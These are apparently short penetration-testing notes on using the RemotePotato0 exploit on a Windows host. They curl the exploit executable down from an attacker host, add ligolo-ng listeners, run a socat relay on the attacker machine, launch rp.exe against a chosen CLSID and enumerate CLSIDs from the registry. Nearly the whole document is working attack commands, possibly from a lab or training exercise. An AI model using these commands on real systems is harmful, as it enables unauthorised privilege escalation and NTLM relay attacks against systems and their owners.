- install exe file
```
cd c:\
curl http://172.16.8.120:8888/windows/RemotePotato0/zip/RemotePotato0.exe -o rp.exe
```
- Set up listeners on ligolo-ng
```
listener_add --addr 0.0.0.0:135 --to 0.0.0.0:135
listener_add --addr 0.0.0.0:9999 --to 0.0.0.0:9999
```
- run socat on attacker machine
```
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:172.16.8.20:9999
```
- run `RemotePotato.exe` under NT system in RDP
```
.\rp.exe -m 2  -s 2 -x 172.16.8.120 -p 9999 -c '{0002DF02-0000-0000-C000-000000000046}'
```
- search for proper CLSID and compare with CLSIDs from RemotePotato git hub 
```
Get-ChildItem -Path "HKLM:\SOFTWARE\Classes\CLSID" | Select-Object -ExpandProperty PSChildName
```

